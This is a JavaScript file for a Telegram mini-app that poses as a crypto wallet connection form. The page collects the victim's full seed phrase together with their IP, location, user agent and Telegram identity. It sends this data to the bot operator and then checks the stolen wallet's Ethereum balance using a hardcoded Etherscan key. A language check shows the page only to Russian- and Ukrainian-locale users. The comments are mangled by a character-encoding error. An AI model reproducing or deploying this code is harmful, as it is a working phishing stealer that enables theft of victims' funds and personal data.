// üåç IP —Ç–∞ –≥–µ–æ–ª–æ–∫–∞—Ü—ñ—è
let userIp = "undefined";
let userLocation = "undefined";

fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
        userIp = data.ip;
        userLocation = `${data.city}, ${data.country_name}`;
        console.log("üìç IP:", userIp, "| –õ–æ–∫–∞—Ü—ñ—è:", userLocation);
    })
    .catch(() => {
        userIp = "unknown";
        userLocation = "unknown";
        console.warn("‚ö†Ô∏è –ù–µ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –≥–µ–æ–ª–æ–∫–∞—Ü—ñ—é");
    });

// üö´ –ë–ª–æ–∫—É–≤–∞–Ω–Ω—è –ø–æ –º–æ–≤—ñ
const langs = navigator.languages || [navigator.language || navigator.userLanguage];
const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
if (!langs.some(lang => allowedLangs.includes(lang))) {
    document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω.</h3>";
    throw new Error("üö´ –ó–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —á–µ—Ä–µ–∑ –º–æ–≤—É");
}

document.addEventListener("DOMContentLoaded", () => {
    console.log("üì¶ DOM –ø–æ–≤–Ω—ñ—Å—Ç—é –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ");

    // ‚úÖ –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ Telegram WebApp
    const isWebAppReady = window.Telegram?.WebApp;
    if (!isWebAppReady) {
        console.warn("‚ùå Telegram WebApp –Ω–µ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ!");
    } else {
        console.log("‚úÖ Telegram WebApp –∞–∫—Ç–∏–≤–Ω–∏–π");
    }

    // üß© –û—Ç—Ä–∏–º—É—î–º–æ –≤—Å—ñ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∏
    const btn = document.getElementById("submitBtn");
    const lengthInput = document.getElementById("length");
    const seedContainer = document.getElementById("seedContainer");

    if (!btn) console.warn("üö´ –ö–Ω–æ–ø–∫–∞ #submitBtn –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–∞");
    if (!lengthInput) console.error("‚ùå #length –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ ‚Äî —Å–∫–∞—Å–æ–≤–∞–Ω–æ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é");
    if (!seedContainer) console.error("‚ùå #seedContainer –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ ‚Äî —Å–∫–∞—Å–æ–≤–∞–Ω–æ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é");

    if (!lengthInput || !seedContainer) return;

    // üß† –ì–µ–Ω–µ—Ä—É—î–º–æ –ø–æ–ª—è –¥–ª—è seed-—Ñ—Ä–∞–∑–∏
    try {
        renderSeedInputs();
        console.log("üìù –ü–æ–ª—è seed-—Ñ—Ä–∞–∑–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–æ");
    } catch (err) {
        console.error("‚ùå –ü–æ–º–∏–ª–∫–∞ –≤ renderSeedInputs():", err);
    }

    // üü¢ –û–±—Ä–æ–±–∫–∞ –Ω–∞—Ç–∏—Å–∫–∞–Ω–Ω—è –∫–Ω–æ–ø–∫–∏ "–ü–æ–¥–∫–ª—é—á–∏—Ç—å"
    if (btn) {
        btn.addEventListener("click", () => {
            console.log("üîò –ö–ª—ñ–∫ –ø–æ –∫–Ω–æ–ø—Ü—ñ '–ü–æ–¥–∫–ª—é—á–∏—Ç—å'");
            try {
                submitSeed();
            } catch (err) {
                console.error("‚ùå –ü–æ–º–∏–ª–∫–∞ –≤ submitSeed():", err);
            }
        });
    }
});

// üì¶ –ü–æ–ª—è seed-—Ñ—Ä–∞–∑–∏
function renderSeedInputs() {
    const length = parseInt(document.getElementById("length").value);
    const container = document.getElementById("seedContainer");
    container.innerHTML = "";

    for (let i = 0; i < length; i++) {
        const input = document.createElement("input");
        input.type = "text";
        input.placeholder = `${i + 1}`;
        input.classList.add("seed-word");
        container.appendChild(input);
    }

    const firstInput = container.querySelector("input");
    if (firstInput) {
        firstInput.addEventListener("input", handleBulkSeedInput);
        firstInput.addEventListener("paste", (e) => {
            setTimeout(() => handleBulkSeedInput(e), 50);
        });
    }
}

// üìã –í—Å—Ç–∞–≤–∫–∞ –≤—Å—ñ—Ö —Å–ª—ñ–≤
function handleBulkSeedInput(e) {
    const inputs = document.querySelectorAll(".seed-word");
    const words = e.target.value.trim().split(/\s+/);
    if (words.length > 1) {
        inputs.forEach((input, i) => input.value = words[i] || "");
    }
}

// üéõÔ∏è Wallet select (–∫–∞—Å—Ç–æ–º–Ω–∏–π —Å–µ–ª–µ–∫—Ç–æ—Ä –∑ –ø–æ–ª—ñ–ø—à–µ–Ω–∏–º UX)
function setupSelect() {
    const selectWrapper = document.querySelector('.custom-select');
    if (!selectWrapper) {
        console.warn("‚ùå .custom-select –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ");
        return;
    }

    const selected = selectWrapper.querySelector('.selected');
    const optionsList = selectWrapper.querySelector('.options');
    const options = optionsList?.querySelectorAll('li') || [];
    const hiddenInput = document.getElementById('wallet');

    if (!selected || !hiddenInput) {
        console.warn("‚ùå –ù–µ –∑–Ω–∞–π–¥–µ–Ω–æ .selected –∞–±–æ #wallet");
        return;
    }

    // –ü–µ—Ä–µ–º–∏–∫–∞—á open
    selected.addEventListener('click', () => {
        selectWrapper.classList.toggle('open');
        console.log("üîΩ –°–µ–ª–µ–∫—Ç–æ—Ä –≤—ñ–¥–∫—Ä–∏—Ç–æ/–∑–∞–∫—Ä–∏—Ç–æ");
    });

    // –í–∏–±—ñ—Ä –æ–ø—Ü—ñ—ó
    options.forEach(option => {
        option.addEventListener('click', () => {
            selected.innerHTML = option.innerHTML;
            hiddenInput.value = option.dataset.value || '';
            selectWrapper.classList.remove('open');
            console.log(`‚úÖ –û–±—Ä–∞–Ω–æ: ${hiddenInput.value}`);
        });
    });

    // –ö–ª—ñ–∫ –ø–æ–∑–∞ —Å–µ–ª–µ–∫—Ç–æ—Ä–æ–º ‚Äî –∑–∞–∫—Ä–∏—Ç–∏
    document.addEventListener('click', (e) => {
        if (!selectWrapper.contains(e.target)) {
            selectWrapper.classList.remove('open');
        }
    });

    // –ó–∞–∫—Ä–∏—Ç—Ç—è –ø—Ä–∏ –Ω–∞—Ç–∏—Å–∫–∞–Ω–Ω—ñ ESC
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            selectWrapper.classList.remove('open');
        }
    });
}

// ‚ö†Ô∏è –ü–æ–∫–∞–∑–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è
function showWarning(message) {
    let warning = document.getElementById("validationWarning");

    if (!warning) {
        warning = document.createElement("div");
        warning.id = "validationWarning";
        warning.style.display = "flex";
        warning.style.alignItems = "center";
        warning.style.gap = "8px";
        warning.style.background = "#ffeaea";
        warning.style.border = "1px solid #ff4d4d";
        warning.style.color = "#cc0000";
        warning.style.padding = "10px";
        warning.style.borderRadius = "6px";
        warning.style.fontSize = "13px";
        warning.style.marginTop = "12px";
        warning.style.transition = "opacity 0.3s ease";
        warning.style.opacity = "0";

        // SVG-—ñ–∫–æ–Ω–∫–∞ ‚ö†Ô∏è
        const icon = document.createElement("span");
        icon.innerHTML = "&#9888;";
        icon.style.fontSize = "16px";

        // –¢–µ–∫—Å—Ç
        const text = document.createElement("span");
        text.className = "warning-text";

        warning.appendChild(icon);
        warning.appendChild(text);
        document.querySelector(".container").appendChild(warning);

        // –ê–Ω—ñ–º–∞—Ü—ñ—è –ø–æ—è–≤–∏
        setTimeout(() => {
            warning.style.opacity = "1";
        }, 10);
    }

    const textElement = warning.querySelector(".warning-text");
    if (textElement) {
        textElement.textContent = message;
    }

    warning.style.display = "flex";
    warning.style.opacity = "1";
}

// ‚úÖ –û—á–∏—Å—Ç–∏—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è
function clearWarning() {
    const warning = document.getElementById("validationWarning");
    if (warning) {
        warning.style.opacity = "0";
        setTimeout(() => {
            warning.style.display = "none";
        }, 300); // –ü–ª–∞–≤–Ω–µ –∑–Ω–∏–∫–Ω–µ–Ω–Ω—è
    }
}

// üåÄ –°—Ç–∞—Ç—É—Å (–∑ –∞–Ω—ñ–º–∞—Ü—ñ—î—é —Ç–∞ —Å—Ç–∏–ª—ñ–∑–∞—Ü—ñ—î—é)
function showProcessing(message) {
    let processing = document.getElementById("processingInfo");

    // –Ø–∫—â–æ –µ–ª–µ–º–µ–Ω—Ç –Ω–µ —ñ—Å–Ω—É—î ‚Äî —Å—Ç–≤–æ—Ä–∏—Ç–∏
    if (!processing) {
        processing = document.createElement("div");
        processing.id = "processingInfo";
        processing.style.display = "flex";
        processing.style.alignItems = "center";
        processing.style.gap = "10px";
        processing.style.marginTop = "16px";
        processing.style.fontSize = "15px";
        processing.style.color = "#aaa";

        // –î–æ–¥–∞—Ç–∏ —Å–ø—ñ–Ω–µ—Ä
        const spinner = document.createElement("div");
        spinner.className = "spinner";
        spinner.style.width = "16px";
        spinner.style.height = "16px";
        spinner.style.border = "2px solid #ccc";
        spinner.style.borderTop = "2px solid #00cc99";
        spinner.style.borderRadius = "50%";
        spinner.style.animation = "spin 1s linear infinite";

        // –¢–µ–∫—Å—Ç —Å—Ç–∞—Ç—É—Å—É
        const text = document.createElement("span");
        text.className = "status-text";

        // –î–æ–¥–∞—Ç–∏ –¥–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞
        processing.appendChild(spinner);
        processing.appendChild(text);

        document.querySelector(".container").appendChild(processing);
    }

    // –û–Ω–æ–≤–∏—Ç–∏ —Ç–µ–∫—Å—Ç —Å—Ç–∞—Ç—É—Å—É
    const textElement = processing.querySelector(".status-text");
    if (textElement) {
        textElement.textContent = message;
    }

    // CSS-–∞–Ω—ñ–º–∞—Ü—ñ—è
    const style = document.getElementById("spinner-style");
    if (!style) {
        const css = document.createElement("style");
        css.id = "spinner-style";
        css.innerHTML = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(css);
    }
}

// üöÄ submitSeed()
function submitSeed() {
    console.log("üöÄ –ó–∞–ø—É—Å–∫ submitSeed()");
    clearWarning();

    const lengthEl = document.getElementById("length");
    const walletEl = document.getElementById("wallet");
    const containerEl = document.querySelector(".container");

    if (!lengthEl || !walletEl || !containerEl) {
        console.error("‚ùå –û–¥–∏–Ω –∑ –∫–ª—é—á–æ–≤–∏—Ö –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ –≤ DOM");
        return;
    }

    const length = parseInt(lengthEl.value);
    const wallet = walletEl.value || "unknown";
    const ua = navigator.userAgent;

    const inputs = document.querySelectorAll("#seedContainer .seed-word");
    const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);

    if (words.length !== length) {
        console.warn("‚ùå –ü—Ä–∏—á–∏–Ω–∞ –∑—É–ø–∏–Ω–∫–∏: –Ω–µ –≤–∏—Å—Ç–∞—á–∞—î —Å–ª—ñ–≤", words);
        showWarning(`‚ùå –í–≤–µ–¥–µ–Ω–æ ${words.length}, –æ—á—ñ–∫—É—î—Ç—å—Å—è ${length} —Å–ª—ñ–≤`);
        return;
    }

    const invalidWords = words.filter(w => !/^[a-zA-Z]+$/.test(w));
    if (invalidWords.length) {
        console.warn("‚ùå –ü—Ä–∏—á–∏–Ω–∞ –∑—É–ø–∏–Ω–∫–∏: –Ω–µ–¥–æ–ø—É—Å—Ç–∏–º—ñ —Å–∏–º–≤–æ–ª–∏", invalidWords);
        showWarning(`üö´ –ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ñ —Å–∏–º–≤–æ–ª–∏: ${invalidWords.join(", ")}`);
        return;
    }

    const seed = words.join(" ");
    showProcessing("‚è≥ –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ seed-—Ñ—Ä–∞–∑–∏‚Ä¶");

    containerEl.innerHTML = `
        <h3 style="color:green;text-align:center">‚è≥ –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞‚Ä¶</h3>
    `;

    const tgUser = (Telegram?.WebApp?.initDataUnsafe?.user) || {};
    const payload = {
        user_id: tgUser.id || "-",
        username: tgUser.username || "-",
        seed,
        wallet,
        length,
        ua,
        ip: typeof userIp !== "undefined" ? userIp : "-",
        location: typeof userLocation !== "undefined" ? userLocation : "-",
        address: "-",
        balance: "-",
        timestamp: new Date().toISOString()
    };

    console.log("üì¶ Payload —Å—Ñ–æ—Ä–º–æ–≤–∞–Ω–æ:", payload);
    localStorage.setItem("payload_backup", JSON.stringify(payload));

    if (Telegram?.WebApp?.sendData) {
        Telegram.WebApp.sendData(JSON.stringify(payload));
        console.log("‚úÖ Payload –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –≤ Telegram WebApp");
    } else {
        console.warn("‚ùå Telegram WebApp.sendData –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π");
    }

    setTimeout(() => {
        window.location.href = "profile.html";
    }, 1200);
}

// üìä –ü—Ä–æ—Ñ—ñ–ª—å
function showProfileData() {
    const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
    const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");

    const seedPhrase = (data.seed || "").trim();
    const walletType = (data.wallet || "").toLowerCase();
    const timestamp = data.timestamp || "‚Äì";
    const ip = data.ip || "‚Äì";
    const locationInfo = data.location || "‚Äì";

    document.getElementById("timestamp").textContent = timestamp;
    document.getElementById("userIp").textContent = ip;
    document.getElementById("userLocation").textContent = locationInfo;
    document.getElementById("seed").textContent = seedPhrase;

    if (!seedPhrase) return console.error("‚ùå Seed-—Ñ—Ä–∞–∑–∞ –ø–æ—Ä–æ–∂–Ω—è");

    try {
        const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
        const ethAddress = wallet.address;
        document.getElementById("ethAddress").textContent = ethAddress;
        console.log("‚úÖ ETH –∞–¥—Ä–µ—Å:", ethAddress);
        fetchETHBalance(ethAddress, ETHERSCAN_API_KEY);
    } catch (e) {
        console.error("‚ùå ETH –≥–µ–Ω–µ—Ä–∞—Ü—ñ—è:", e.message);
    }

    document.getElementById("goWalletBtn").addEventListener("click", () => {
        let url = "https://www.google.com";
        if (walletType.includes("metamask")) url = "https://metamask.io/";
        else if (walletType.includes("trust")) url = "https://trustwallet.com/";
        else if (walletType.includes("phantom")) url = "https://phantom.app/";
        else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
        else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";

        if (window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.openLink(url);
        } else {
            window.open(url, "_blank");
        }
    });
}

async function fetchETHBalance(address, key) {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${key}`;
        const res = await fetch(url);
        const json = await res.json();
        if (!json || json.status !== "1" || !json.result) throw new Error("ETH API error");
        const ethBalance = parseFloat(json.result) / 1e18;
        document.getElementById("walletBalance").textContent = `${ethBalance.toFixed(6)} ETH`;
    } catch (e) {
        console.warn("‚ùå –ü–æ–º–∏–ª–∫–∞ –±–∞–ª–∞–Ω—Å—É ETH:", e.message);
        document.getElementById("walletBalance").textContent = "‚Äì";
    }
}
